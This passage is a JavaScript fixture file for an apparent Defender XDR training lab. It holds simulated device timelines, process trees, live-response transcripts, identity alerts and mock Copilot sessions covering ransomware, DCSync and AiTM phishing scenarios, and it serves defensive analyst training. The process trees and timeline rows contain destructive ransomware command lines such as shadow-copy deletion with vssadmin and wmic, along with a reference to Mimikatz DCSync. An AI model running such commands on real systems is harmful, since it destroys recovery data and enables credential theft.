    { name:'CORP-WIFI',  gateway:'10.20.9.1',  dhcp:'10.20.0.10', devices:96,  state:'Monitored', reason:'Correlated as corporate.' },
    { name:'BMS-VLAN',   gateway:'10.20.6.1',  dhcp:'10.20.6.1',  devices:24,  state:'Monitored', reason:'Manually added to the monitored list — OT segment would otherwise be ignored.' },
    { name:'BRANCH-LAN', gateway:'10.20.12.1', dhcp:'10.20.12.1', devices:18,  state:'Monitored', reason:'Correlated as corporate.' },
    { name:'GUEST-WIFI', gateway:'192.168.50.1', dhcp:'192.168.50.1', devices:0, state:'Ignored', reason:'Classified non-corporate. Devices here are not discovered or listed.' },
    { name:'HOME-NET-*', gateway:'(various)',  dhcp:'(various)',  devices:0,   state:'Ignored', reason:'Private networks are never listed or actively scanned.' },
  ],
  exclusions:[
    { target:'10.20.6.0/24', kind:'Subnet',      reason:'BMS/OT segment — passive discovery only, no active probes against facility controllers.' },
    { target:'10.20.4.15',   kind:'IP address',  reason:'Deception host. Probing it would generate false lure hits.' },
    { target:'Tier-0',       kind:'Device group', reason:'Domain controllers excluded from acting as standard-discovery scanners.' },
  ],
  authenticatedScans:[
    { name:'Core network — SNMP', scanner:'DC01', targets:'10.20.0.0/24', protocol:'SNMPv3 (read-only)', interval:'Every 4 hours', lastRun:'2026-06-28T14:00:00Z', found:3, state:'Active' },
    { name:'Branch network — SNMP', scanner:'WKS-02', targets:'10.20.12.0/24', protocol:'SNMPv2 (read-only)', interval:'Daily', lastRun:'2026-06-27T02:00:00Z', found:1, state:'Paused' },
  ],
  enterpriseIoT:{ enabled:true, note:'Defender for IoT is onboarded in the portal, so IoT/OT assets are classified and appear on the IoT devices tab.' },
};

// Keep the discovery settings honest about the estate: the per-network counts and the
// authenticated-scan results are derived from the inventory rather than typed in, so
// the numbers on the settings page always match what the device list actually shows.
DEVICE_DISCOVERY_SETTINGS.monitoredNetworks.forEach(net => {
  if (net.state !== 'Monitored') return;
  net.devices = DISCOVERED_DEVICES.filter(d => d.network === net.name).length
              + DEVICES.filter(d => net.name === 'CORP-LAN').length;
});
DEVICE_DISCOVERY_SETTINGS.authenticatedScans.forEach(scan => {
  const prefix = scan.targets.split('/')[0].split('.').slice(0, 3).join('.') + '.';
  scan.found = DISCOVERED_DEVICES.filter(d =>
    d.discoverySource === 'Authenticated scan' && d.ip.startsWith(prefix)).length;
});

const DEVICE_LIVE_RESPONSE = {
  'FIN-FS-02': {
    operator:'Me',
    started:'2026-06-28T10:23:15Z',
    status:'Connected',
    transcript:[
      { prompt:'connect FIN-FS-02', output:'Session established through Defender for Endpoint. Role: Live response operator.' },
      { prompt:'dir C:\\ProgramData', output:'2026-06-28 10:17  locker.exe\n2026-06-28 10:18  RECOVER-FILES.txt\n2026-06-28 09:56  finance-cache.db' },
      { prompt:'getfile C:\\ProgramData\\locker.exe', output:'File queued for collection as evidence item LR-20260628-001.' },
      { prompt:'run triage.ps1', output:'Process tree captured. Network connections: none active after isolation. Shadow-copy deletion artifacts found.' },
    ],
    log:['10:23:15 Session started','10:23:31 Directory listing returned','10:23:49 File collection queued','10:24:18 Triage script completed'],
  },
  'WKS-03': {
    operator:'Me',
    started:'2026-06-28T15:03:10Z',
    status:'Connected',
    transcript:[
      { prompt:'connect WKS-03', output:'Session established through Defender for Endpoint. Role: Live response operator.' },
      { prompt:'dir C:\\Users\\Public', output:'2026-06-28 15:00  scanner.exe\n2026-06-28 15:00  scanner.log' },
      { prompt:'getfile C:\\Users\\Public\\scanner.exe', output:'File queued for collection as evidence item LR-20260628-014.' },
      { prompt:'run autoruns-lite.ps1', output:'Run key references C:\\Users\\Public\\scanner.exe. No signed publisher metadata found.' },
    ],
    log:['15:03:10 Session started','15:03:22 Directory listing returned','15:03:37 File collection queued','15:04:02 Autoruns triage completed'],
  },
};

const DEVICE_INVESTIGATION_PACKAGES = {
  'FIN-FS-02': {
    status:'Ready to download',
    collected:'2026-06-28T10:25:44Z',
    reason:'High-confidence ransomware disruption. Collect package before wiping or rebuilding the file server.',
    contents:[
      'Autoruns and scheduled task inventory',
      'Running processes and loaded modules',
      'Network connections and DNS cache',
      'Security event log slices around the incident',
      'Defender Antivirus detections and quarantine metadata',
      'MDE sensor health and isolation state',
    ],
    guidance:[
      'Use when you need host-level evidence for containment, scoping, or handoff to forensics.',
      'Collect before destructive remediation so process, persistence, and sensor state are preserved.',
      'Do not treat the ZIP as a malware sandbox result; pair it with Timeline and Advanced hunting rows.',
    ],
  },
  'WKS-03': {
    status:'Collection in progress',
    collected:'2026-06-28T15:05:20Z',
    reason:'Unsigned look-alike scanner binary executed from a user-writable folder.',
    contents:[
      'Process execution history',
      'File metadata for scanner.exe and nearby artifacts',
      'Browser download and Mark-of-the-Web evidence',
      'Network connection summary',
      'Persistence locations',
    ],
    guidance:[
      'Use to validate whether the look-alike binary arrived through download, removable media, or lateral movement.',
      'Compare package artifacts with the Timeline technique markers before closing the incident.',
    ],
  },
};

const DEVICE_PROCESS_TREES = {
  'FIN-FS-02': [
    { depth:0, name:'services.exe', detail:'Service Control Manager' },
    { depth:1, name:'cmd.exe', detail:'cmd.exe /c copy \\\\WKS-03\\share\\locker.exe C:\\ProgramData\\locker.exe' },
    { depth:2, name:'locker.exe', detail:'locker.exe --encrypt --shares' },
    { depth:3, name:'vssadmin.exe', detail:'vssadmin delete shadows /all /quiet' },
    { depth:3, name:'wmic.exe', detail:'wmic shadowcopy delete' },
  ],
  'WKS-03': [
    { depth:0, name:'explorer.exe', detail:'Interactive shell for jdoe' },
    { depth:1, name:'scanner.exe', detail:'C:\\Users\\Public\\scanner.exe' },
    { depth:2, name:'rundll32.exe', detail:'Network beacon helper loaded after process start' },
  ],
};

// Per-device timeline. Mirrors the Defender for Endpoint device Timeline tab:
// two row kinds interleaved chronologically.
//   - kind='technique' : MITRE marker row (blue T icon). Side pane explains
//     that the related Advanced Hunting query returns the UNDERLYING events,
//     not this marker row itself.
//   - kind='event'     : a raw endpoint event (Process / Network / Logon /
//     File / Registry / Image-load). Carries the AttackTechniques column so
//     it joins back to the technique marker via techniqueId.
const DEVICE_TIMELINE_EVENTS = {
  'WKS-03': [
    { kind:'technique', time:'2026-06-28T15:00:20Z', techniqueId:'T1036',
      techniqueName:'Masquerading', tactic:'Defense Evasion',
      description:'Untrusted binary in C:\\Users\\Public named to look like a legitimate scanner. Detected from process execution + signer mismatch.' },
    { kind:'event', time:'2026-06-28T15:00:15Z', table:'DeviceImageLoadEvents', actionType:'ImageLoaded',
      title:'amsi.dll loaded by scanner.exe', description:'AMSI provider loaded into untrusted process — common precursor to AMSI-bypass attempts.',
      fileName:'amsi.dll', folder:'C:\\Windows\\System32\\amsi.dll', cmdline:'(loaded by scanner.exe)',
      account:'jdoe', techniqueId:'T1562', techniqueName:'Impair Defenses', eventType:'Image load' },
    { kind:'technique', time:'2026-06-28T15:00:12Z', techniqueId:'T1071',
      techniqueName:'Application Layer Protocol', tactic:'Command and Control',
      description:'Outbound HTTPS to a non-business reputation-scored host immediately after process launch.' },
    { kind:'event', time:'2026-06-28T15:00:08Z', table:'DeviceNetworkEvents', actionType:'ConnectionSuccess',
      title:'Outbound HTTPS connection from scanner.exe', description:'Connection to 185.199.111.12:443 (low-reputation).',
      fileName:'scanner.exe', folder:'C:\\Users\\Public\\scanner.exe', cmdline:'scanner.exe',
      account:'jdoe', remoteIP:'185.199.111.12', remotePort:443,
      techniqueId:'T1071', eventType:'Network' },
    { kind:'event', time:'2026-06-28T15:00:01Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'scanner.exe process created', description:'Parent: explorer.exe. Image path under C:\\Users\\Public.',
      fileName:'scanner.exe', folder:'C:\\Users\\Public\\scanner.exe', cmdline:'scanner.exe',
      account:'jdoe', sha256:ROGUE_HASH, techniqueId:'T1036', eventType:'Process' },
    { kind:'event', time:'2026-06-28T15:00:00Z', table:'DeviceLogonEvents', actionType:'LogonSuccess',
      title:'Interactive logon (jdoe)', description:'Local interactive logon after a failed attempt.',
      account:'jdoe', logonType:'Interactive', techniqueId:'T1078', eventType:'Logon' },
    { kind:'technique', time:'2026-06-28T14:59:55Z', techniqueId:'T1110',
      techniqueName:'Brute Force', tactic:'Credential Access',
      description:'Failed → successful logon pair on the same account within seconds.' },
    { kind:'event', time:'2026-06-28T14:59:48Z', table:'DeviceLogonEvents', actionType:'LogonFailed',
      title:'Interactive logon failed (jdoe)', description:'BadPassword on local console.',
      account:'jdoe', failureReason:'BadPassword', techniqueId:'T1110', eventType:'Logon' },
  ],
  'FIN-FS-02': [
    { kind:'technique', time:'2026-06-28T10:20:10Z', techniqueId:'T1490',
      techniqueName:'Inhibit System Recovery', tactic:'Impact',
      description:'Shadow-copy deletion immediately before mass file rename — classic ransomware staging.' },
    { kind:'event', time:'2026-06-28T10:20:04Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'vssadmin delete shadows /all /quiet', description:'Wipes Volume Shadow Copies so encrypted files cannot be restored locally.',
      fileName:'vssadmin.exe', folder:'C:\\Windows\\System32\\vssadmin.exe',
      cmdline:'vssadmin delete shadows /all /quiet', account:'fin-svc', flagged:true,
      techniqueId:'T1490', eventType:'Process' },
    { kind:'event', time:'2026-06-28T10:19:15Z', table:'DeviceEvents', actionType:'EDRClientResourceManagerCriticalMode',
      title:'EDR client entered resource-protection mode', description:'MsSense.exe Resource Manager reduced nonessential telemetry while ransomware containment completed.',
      fileName:'MsSense.exe', folder:'C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe',
      cmdline:'MsSense.exe ResourceManager CriticalMode', account:'SYSTEM',
      techniqueId:'T1486', eventType:'Sensor' },
    { kind:'technique', time:'2026-06-28T10:18:30Z', techniqueId:'T1486',
      techniqueName:'Data Encrypted for Impact', tactic:'Impact',
      description:'Mass file rename to .locked extension across mapped shares.' },
    { kind:'event', time:'2026-06-28T10:18:21Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'locker.exe --encrypt --shares', description:'Untrusted binary executed from C:\\ProgramData with encryption arguments.',
      fileName:'locker.exe', folder:'C:\\ProgramData\\locker.exe',
      cmdline:'locker.exe --encrypt --shares', account:'fin-svc', flagged:true,
      techniqueId:'T1486', eventType:'Process' },
    { kind:'technique', time:'2026-06-28T10:18:00Z', techniqueId:'T1021',
      techniqueName:'Remote Services', tactic:'Lateral Movement',
      description:'Remote-interactive logon from a workstation immediately preceded execution of unsigned binaries.' },
    { kind:'event', time:'2026-06-28T10:17:55Z', table:'DeviceLogonEvents', actionType:'LogonSuccess',
      title:'RemoteInteractive logon (fin-svc) from WKS-03', description:'Remote logon over RDP from operator workstation.',
      account:'fin-svc', logonType:'RemoteInteractive', remoteIP:'10.20.7.14',
      techniqueId:'T1021', eventType:'Logon' },
    { kind:'event', time:'2026-06-28T03:44:05Z', table:'DeviceLogonEvents', actionType:'LogonSuccess',
      title:'Network logon (svc-backup)', description:'Network logon from DC01 using Kerberos.',
      account:'svc-backup', logonType:'Network', remoteIP:'10.20.4.55',
      techniqueId:'T1078', eventType:'Logon' },
  ],
  'WKS-01': [
    { kind:'technique', time:'2026-06-28T14:00:20Z', techniqueId:'T1595',
      techniqueName:'Active Scanning', tactic:'Reconnaissance',
      description:'Repeated full-volume scan from an authorized vulnerability-scanner binary. Whitelisted via suppression rule.' },
    { kind:'event', time:'2026-06-28T14:00:11Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'scanner.exe --scan C:\\', description:'Post-update binary (SHA drifted from suppression rule).',
      fileName:'scanner.exe', folder:'C:\\Tools\\Scanner\\scanner.exe',
      cmdline:'scanner.exe --scan C:\\', account:'svc-scan', sha256:POST_UPDATE_HASH,
      techniqueId:'T1595', eventType:'Process' },
    { kind:'event', time:'2026-06-28T09:00:00Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'scanner.exe --scan C:\\ (pre-update)', description:'Pre-update binary, suppression rule still matched.',
      fileName:'scanner.exe', folder:'C:\\Tools\\Scanner\\scanner.exe',
      cmdline:'scanner.exe --scan C:\\', account:'svc-scan', sha256:KNOWN_GOOD_HASH,
      techniqueId:'T1595', eventType:'Process' },
  ],
  'WKS-02': [
    { kind:'technique', time:'2026-06-28T14:15:10Z', techniqueId:'T1595',
      techniqueName:'Active Scanning', tactic:'Reconnaissance',
      description:'Same scanner binary as WKS-01.' },
    { kind:'event', time:'2026-06-28T14:15:02Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'scanner.exe --scan D:\\', description:'Post-update binary on D-drive scan.',
      fileName:'scanner.exe', folder:'C:\\Tools\\Scanner\\scanner.exe',
      cmdline:'scanner.exe --scan D:\\', account:'svc-scan', sha256:POST_UPDATE_HASH,
      techniqueId:'T1595', eventType:'Process' },
    { kind:'event', time:'2026-06-28T09:05:00Z', table:'DeviceProcessEvents', actionType:'ProcessCreated',
      title:'scanner.exe --scan D:\\ (pre-update)', description:'Pre-update binary.',
      fileName:'scanner.exe', folder:'C:\\Tools\\Scanner\\scanner.exe',
      cmdline:'scanner.exe --scan D:\\', account:'svc-scan', sha256:KNOWN_GOOD_HASH,
      techniqueId:'T1595', eventType:'Process' },
  ],
  'DC01': [
    { kind:'technique', time:'2026-06-28T03:44:10Z', techniqueId:'T1003',
      techniqueName:'OS Credential Dumping', tactic:'Credential Access',
      description:'DCSync — directory replication from a non-DC account.' },
    { kind:'event', time:'2026-06-28T03:44:00Z', table:'DeviceEvents', actionType:'DirectoryServicesReplication',
      title:'Directory replication from svc-backup', description:'Replication request from 10.20.4.55 targeting DC01.',
      account:'svc-backup', target:'DC01.hacksmarterlabs.example', techniqueId:'T1003', eventType:'Directory' },
    { kind:'technique', time:'2026-06-28T03:42:10Z', techniqueId:'T1098',
      techniqueName:'Account Manipulation', tactic:'Persistence',
      description:'Modification of AdminSDHolder ACL — sticky-permission persistence on Tier-0 objects.' },
    { kind:'event', time:'2026-06-28T03:42:00Z', table:'DeviceEvents', actionType:'AdminSDHolderModification',
      title:'AdminSDHolder ACL modified', description:'svc-backup added DACL entry on AdminSDHolder.',
      account:'svc-backup', target:'CN=AdminSDHolder,CN=System,DC=example,DC=org',
      techniqueId:'T1098', eventType:'Directory' },
  ],
};

// ---------- Defender for Identity ↔ Defender XDR identity inventory ----------
// One row per security principal that MDI or AAD has on file. Mirrors the
// Defender portal Identities page: account type, sensitive/privileged flags,
// risk level, source connectors, organization-wide observation counts.
const IDENTITIES = [
  { id:'jane.doe@hacksmarterlabs.example', displayName:'Jane Doe', samName:'jane.doe',
    upn:'jane.doe@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-1102',
    accountType:'User', department:'Finance', title:'Senior Analyst',
    riskLevel:'High', sensitive:false, privileged:false,
    sources:['Entra ID','Defender for Identity'],
    firstSeen:'2024-01-15T08:00:00Z', lastSeen:'2026-06-28T08:30:00Z',
    devicesSeen:3, openAlerts:2,
    notes:'Phishing victim. Granted OAuth consent to DocViewer Pro. AiTM cookie suspected.' },
  { id:'svc-backup@hacksmarterlabs.example', displayName:'svc-backup', samName:'svc-backup',
    upn:'svc-backup@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-1144',
    accountType:'Service', department:'IT Operations', title:'Backup service account',
    riskLevel:'High', sensitive:true, privileged:true,
    sources:['Entra ID','Defender for Identity'],
    firstSeen:'2023-09-12T00:00:00Z', lastSeen:'2026-06-28T03:44:00Z',
    devicesSeen:2, openAlerts:2,
    notes:'Suspected compromised. Performed AdminSDHolder modification + DCSync.' },
  { id:'MSOL_AzureSync@hacksmarterlabs.example', displayName:'MSOL_AzureSync', samName:'MSOL_AzureSync',
    upn:'MSOL_AzureSync@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-1206',
    accountType:'Service', department:'Entra Connect', title:'Directory synchronization (Entra Connect)',
    riskLevel:'Informational', sensitive:true, privileged:true,
    sources:['Entra ID','Defender for Identity'],
    firstSeen:'2023-08-01T00:00:00Z', lastSeen:'2026-06-28T15:00:00Z',
    devicesSeen:1, openAlerts:1,
    notes:'Entra Connect sync account. Directory replication is EXPECTED — Suspected DCSync alerts on this principal are a benign true positive when sourced from the Entra Connect server.' },
  { id:'sam.lee@hacksmarterlabs.example', displayName:'Sam Lee', samName:'sam.lee',
    upn:'sam.lee@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-1203',
    accountType:'User', department:'Engineering', title:'Software engineer',
    riskLevel:'Medium', sensitive:false, privileged:false,
    sources:['Entra ID'],
    firstSeen:'2024-04-10T00:00:00Z', lastSeen:'2026-06-28T13:27:00Z',
    devicesSeen:2, openAlerts:1,
    notes:'Risky sign-in from NL (unfamiliar location).' },
  { id:'maria.ross@hacksmarterlabs.example', displayName:'Maria Ross', samName:'maria.ross',
    upn:'maria.ross@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-1208',
    accountType:'User', department:'Sales', title:'Account executive',
    riskLevel:'High', sensitive:false, privileged:false,
    sources:['Entra ID','Defender for Identity'],
    firstSeen:'2024-02-20T00:00:00Z', lastSeen:'2026-06-28T06:40:00Z',
    devicesSeen:2, openAlerts:1,
    notes:'AiTM phishing detected — Entra ID Protection flagged High sign-in risk.' },
  { id:'jdoe@hacksmarterlabs.example', displayName:'jdoe (local)', samName:'jdoe',
    upn:'jdoe@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-1812',
    accountType:'User', department:'Sales', title:'Workstation user (WKS-03)',
    riskLevel:'Medium', sensitive:false, privileged:false,
    sources:['Defender for Identity','Defender for Endpoint'],
    firstSeen:'2025-11-08T12:14:00Z', lastSeen:'2026-06-28T15:00:00Z',
    devicesSeen:1, openAlerts:0,
    notes:'Local-interactive sign-ins on WKS-03 with one failed-then-success pair.' },
  { id:'fin-svc@hacksmarterlabs.example', displayName:'fin-svc', samName:'fin-svc',
    upn:'fin-svc@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-2207',
    accountType:'Service', department:'Finance', title:'Finance file-server service account',
    riskLevel:'High', sensitive:false, privileged:true,
    sources:['Entra ID','Defender for Identity'],
    firstSeen:'2024-09-01T00:00:00Z', lastSeen:'2026-06-28T10:20:00Z',
    devicesSeen:2, openAlerts:2,
    notes:'Used to launch locker.exe + vssadmin shadow-copy deletion on FIN-FS-02.' },
  { id:'krbtgt@hacksmarterlabs.example', displayName:'krbtgt', samName:'krbtgt',
    upn:'krbtgt@hacksmarterlabs.example', sid:'S-1-5-21-1180699209-877415012-3182924384-502',
    accountType:'Service', department:'Active Directory', title:'KDC service account',
    riskLevel:'Informational', sensitive:true, privileged:true,
    sources:['Defender for Identity'],
    firstSeen:'2023-08-01T00:00:00Z', lastSeen:'2026-06-25T00:00:00Z',
    devicesSeen:0, openAlerts:0,
    notes:'Tier-0 KDC account. Watched for Golden Ticket / password reset rotation.' },
];

// Per-identity timeline. Includes the canonical SC-200 MSOL_ DCSync scenario:
// a Suspected DCSync alert on MSOL_AzureSync originating from the Entra
// Connect server. Classification path: benign true positive (true detection,
// expected behavior). Pair with svc-backup's DCSync alert (true positive)
// so the analyst learns to distinguish by WHO + FROM WHERE.
const IDENTITY_TIMELINE = {
  'MSOL_AzureSync@hacksmarterlabs.example': [
    { kind:'alert', time:'2026-06-28T03:45:00Z', alertId:'A105',
      title:'Suspected DCSync attack (replication of directory services)',
      severity:'high', source:'Defender for Identity',
      description:'Directory replication initiated by MSOL_AzureSync from AAD-CONNECT-01.hacksmarterlabs.example targeting DC01.',
      classification:'Benign true positive',
      classificationWhy:'The MSOL_AzureSync account is the Entra Connect directory-sync principal. Its job is to replicate AD objects to the cloud, so it WILL perform DRSGetNCChanges (DCSync) by design. The source host (AAD-CONNECT-01) is the registered Entra Connect server. The detection is accurate (a true DCSync occurred), but the activity is expected → classify as Benign true positive, not False positive (the behavior really happened) and not True positive (no adversary).',
      classifyNote:'Suppression rule scope: source computer = AAD-CONNECT-01, account = MSOL_*.' },
    { kind:'event', time:'2026-06-28T03:44:55Z', actionType:'DirectoryServicesReplication',
      title:'Directory replication from AAD-CONNECT-01', description:'MSOL_AzureSync replicated naming context DC=example,DC=org from DC01.',
      sourceHost:'AAD-CONNECT-01', target:'DC01.hacksmarterlabs.example', techniqueId:'T1003', techniqueName:'OS Credential Dumping' },
    { kind:'event', time:'2026-06-28T03:44:50Z', actionType:'LogonSuccess',
      title:'Network logon (MSOL_AzureSync) on DC01', description:'Kerberos network logon from AAD-CONNECT-01 (10.20.6.20).',
      sourceHost:'AAD-CONNECT-01', target:'DC01.hacksmarterlabs.example', techniqueId:'T1078', techniqueName:'Valid Accounts' },
  ],
  'svc-backup@hacksmarterlabs.example': [
    { kind:'alert', time:'2026-06-28T03:44:00Z', alertId:'A102',
      title:'Suspected DCSync attack (replication of directory services)',
      severity:'high', source:'Defender for Identity',
      description:'Directory replication initiated by svc-backup from a non-domain-controller member server (10.20.4.55) targeting DC01. svc-backup is a tape-backup service principal with no legitimate replication role.',
      classification:'True positive',
      classificationWhy:'svc-backup has no business reason to perform DRSGetNCChanges. The source host is not a registered Entra Connect server. This is a real adversary action (likely credential dumping via Mimikatz lsadump::dcsync). Classify as True positive and start a containment workflow: reset svc-backup password + KRBTGT twice, isolate 10.20.4.55, hunt for tooling artifacts.',
      classifyNote:'Compare to the MSOL_AzureSync DCSync alert (A105) — same alert, different verdict because of WHO is replicating and FROM WHERE.' },
    { kind:'alert', time:'2026-06-28T03:42:00Z', alertId:'A101',
      title:'Possible AdminSDHolder modification',
      severity:'high', source:'Defender for Identity',
      description:'svc-backup added a DACL entry on CN=AdminSDHolder,CN=System,DC=example,DC=org — sticky-permission persistence on every Tier-0 object.',
      classification:'True positive',
      classificationWhy:'AdminSDHolder ACL writes are extremely rare in normal operations and are a textbook persistence technique (T1098). Classify as True positive and revert the ACL.' },
    { kind:'event', time:'2026-06-28T03:44:00Z', actionType:'DirectoryServicesReplication',
      title:'Directory replication request from svc-backup', description:'Replication request from 10.20.4.55 (file-server subnet) — not a domain controller and not Entra Connect.',
      sourceHost:'10.20.4.55', target:'DC01.hacksmarterlabs.example', techniqueId:'T1003', techniqueName:'OS Credential Dumping' },
  ],
  'jane.doe@hacksmarterlabs.example': [
    { kind:'alert', time:'2026-06-28T08:23:00Z', alertId:'A202',
      title:'Anomalous OAuth consent grant', severity:'medium', source:'Defender for Cloud Apps',
      description:'OAuth consent granted to DocViewer Pro with Mail.ReadWrite + Files.Read.All. Consent followed a click on a known phishing URL.',
      classification:'True positive',
      classificationWhy:'Broad mail+files scopes from an unverified publisher consented to immediately after a phishing click is the textbook AiTM-then-OAuth pattern. Revoke consent, sign-out all sessions, force MFA re-registration.' },
    { kind:'alert', time:'2026-06-28T08:11:00Z', alertId:'A201',
      title:'User compromised through phishing email with malicious URL',
      severity:'high', source:'Defender for Office 365',
      description:'Jane clicked secure-document-portal[.]xyz from a phishing email.',
      classification:'True positive', classificationWhy:'Confirmed click on a malicious URL; chain continues into the OAuth consent alert above.' },
    { kind:'event', time:'2026-06-28T08:12:00Z', actionType:'SignInSuccess',
      title:'Sign-in success from 76.21.55.4 (US)', description:'Token issued for Office365, MFA prompt satisfied — likely AiTM cookie replay.',
      techniqueId:'T1078', techniqueName:'Valid Accounts' },
  ],
  'maria.ross@hacksmarterlabs.example': [
    { kind:'alert', time:'2026-06-28T06:40:00Z', alertId:'A401',
      title:'Adversary-in-the-middle phishing session detected', severity:'high',
      source:'Entra ID Protection',
      description:'AiTM session token captured via reverse-proxy phishing kit. Push MFA satisfied by attacker.',
      classification:'True positive',
      classificationWhy:'AiTM bypasses traditional MFA. Containment: revoke refresh tokens, reset password, hunt for OAuth consent / mail-rule additions on her mailbox.' },
  ],
  'sam.lee@hacksmarterlabs.example': [
    { kind:'alert', time:'2026-06-28T13:27:00Z', alertId:'A601',
      title:'Risky sign-in from unfamiliar location', severity:'medium',
      source:'Entra ID Protection',
      description:'Sign-in from 91.219.236.54 (NL). Sam normally signs in from US.',
      classification:'Pending',
      classificationWhy:'Could be travel or VPN — verify with the user before classifying. If unconfirmed, treat as True positive and trigger CA risk-based remediation.' },
  ],
  'fin-svc@hacksmarterlabs.example': [
    { kind:'alert', time:'2026-06-28T10:18:30Z', alertId:'A301',
      title:'Multiple endpoints encrypted by suspected ransomware', severity:'high',
      source:'Defender for Endpoint',
      description:'fin-svc launched locker.exe across mapped shares on FIN-FS-02.',
      classification:'True positive',
      classificationWhy:'Service account performing impact-stage operations on a file server is never benign. Isolate FIN-FS-02, disable fin-svc, restore shares.' },
  ],
};

// MITRE matrix tactic ↔ technique lookup so the side pane can show a tactic
// pill even when the timeline row didn't pre-bake it.
const TECHNIQUE_TACTIC_LOOKUP = (() => {
  const map = {};
  if (typeof MITRE_ATTCK !== 'undefined') {
    MITRE_ATTCK.forEach(t => t.techniques.forEach(te => { if (!map[te.id]) map[te.id] = t.name; }));
  }
  return map;
})();

// Extend MOCK_QUERY_RESULTS so the prefilled "Hunt for related events" query
// returns the UNDERLYING event rows (not the technique marker), filtered by
// DeviceId + AttackTechniques. We only seed kind='event' rows.
(function seedDeviceEventFixtures() {
  const grouped = {};
  Object.entries(DEVICE_TIMELINE_EVENTS).forEach(([deviceId, rows]) => {
    rows.filter(r => r.kind === 'event').forEach(e => {
      const table = ['DeviceLogonEvents','DeviceNetworkEvents','DeviceFileEvents',
        'DeviceRegistryEvents','DeviceImageLoadEvents','DeviceProcessEvents'].includes(e.table)
        ? e.table : 'DeviceEvents';
      const row = {
        Timestamp: e.time,
        DeviceId: deviceId,
        DeviceName: deviceId,
        ActionType: e.actionType,
        FileName: e.fileName || '',
        FolderPath: e.folder || '',
        ProcessCommandLine: e.cmdline || '',
        AccountName: e.account || '',
        AttackTechniques: e.techniqueId,
      };
      if (e.remoteIP) row.RemoteIP = e.remoteIP;
      if (e.remotePort) row.RemotePort = e.remotePort;
      if (e.logonType) row.LogonType = e.logonType;
      if (e.failureReason) row.FailureReason = e.failureReason;
      if (e.target) row.Target = e.target;
      (grouped[table] = grouped[table] || []).push(row);
    });
  });
  Object.entries(grouped).forEach(([table, rows]) => {
    if (!MOCK_QUERY_RESULTS[table]) MOCK_QUERY_RESULTS[table] = [];
    rows.forEach(r => MOCK_QUERY_RESULTS[table].push(r));
  });
})();

// === local-tasks fixtures (auto-merged by integrate.py — do not hand-edit between markers) ===
// --- T01: out/t01-copilot-sessions.js ---
const COPILOT_SESSIONS = [
  { id: 'cs-001', name: 'Phishing wave triage - finance dept', owner: 'R. Vance', workspace: 'Primary', lastActivity: '2026-06-28T14:02:00Z', promptCount: 9, plugins: [ 'Defender XDR', 'Sentinel' ], pinned: true },
  { id: 'cs-002', name: 'Ransomware indicator in SIEM alerts', owner: 'M. Okafor', workspace: 'SOC-EU', lastActivity: '2026-06-30T15:45:00Z', promptCount: 7, plugins: [ 'Sentinel', 'Defender XDR' ], pinned: false },
  { id: 'cs-003', name: 'OAuth app misuse event timeline', owner: 'L. Harper', workspace: 'Primary', lastActivity: '2026-06-29T14:58:00Z', promptCount: 5, plugins: [ 'Defender XDR', 'Defender Threat Intelligence' ], pinned: true },
  { id: 'cs-004', name: 'DLP alert - potential employee data exfiltration', owner: 'T. Martinez', workspace: 'Primary', lastActivity: '2026-06-27T15:30:00Z', promptCount: 11, plugins: [ 'Purview', 'Defender XDR' ], pinned: true },
  { id: 'cs-005', name: 'Vulnerability scan prioritization - high risk', owner: 'E. Silva', workspace: 'Primary', lastActivity: '2026-06-30T17:40:00Z', promptCount: 8, plugins: [ 'Defender XDR', 'Sentinel' ], pinned: false },
  { id: 'cs-006', name: 'Incident summary for C-suite: ransomware containment', owner: 'C. Williams', workspace: 'Primary', lastActivity: '2026-06-29T16:58:00Z', promptCount: 6, plugins: [ 'Defender XDR' ], pinned: false },
  { id: 'cs-007', name: 'TI analysis - suspicious DNS traffic', owner: 'J. Patel', workspace: 'Primary', lastActivity: '2026-06-30T14:25:00Z', promptCount: 3, plugins: [ 'Sentinel', 'Defender Threat Intelligence' ], pinned: true },
  { id: 'cs-008', name: 'Risk matrix for recent sign-ins - SOC report', owner: 'K. Kim', workspace: 'SOC-EU', lastActivity: '2026-06-30T17:59:00Z', promptCount: 4, plugins: [ 'Sentinel', 'Entra' ], pinned: true },
  { id: 'cs-009', name: 'INC-1042 phishing-to-OAuth investigation', owner: 'A. Lee', workspace: 'Primary', lastActivity: '2026-06-30T18:12:00Z', promptCount: 7, plugins: [ 'Defender XDR', 'Purview' ], pinned: true }
];

// --- T02: out/t02-copilot-transcripts.js ---
const COPILOT_TRANSCRIPTS = [
  {
    sessionId: 'cs-001',
    steps: [
      { role: 'analyst', text: 'Reviewing the incident details for the phishing wave. Which alerts are correlated?', plugin: 'none', skill: 'Incident summary', pinned: true },
      { role: 'copilot', text: 'Two alerts are grouped: a malicious URL click and a mailbox activity spike on the same users.', plugin: 'Defender XDR', skill: 'Correlation', pinned: false },
      { role: 'analyst', text: 'Which users clicked the link?', plugin: 'none', skill: 'Entity pivot', pinned: true },
      { role: 'copilot', text: 'R. Vance and M. Okafor are the affected users in this lab case.', plugin: 'Defender XDR', skill: 'Entity expansion', pinned: false }
    ]
  },
  {
    sessionId: 'cs-002',
    steps: [
      { role: 'analyst', text: 'This SIEM feed looks like ransomware staging. What makes it suspicious?', plugin: 'none', skill: 'Threat hunting', pinned: true },
      { role: 'copilot', text: 'The process chain shows archive creation, share discovery, and bulk file rename activity from a finance workstation.', plugin: 'Sentinel', skill: 'KQL reasoning', pinned: false },
      { role: 'analyst', text: 'Should we isolate the device?', plugin: 'none', skill: 'Response planning', pinned: true },
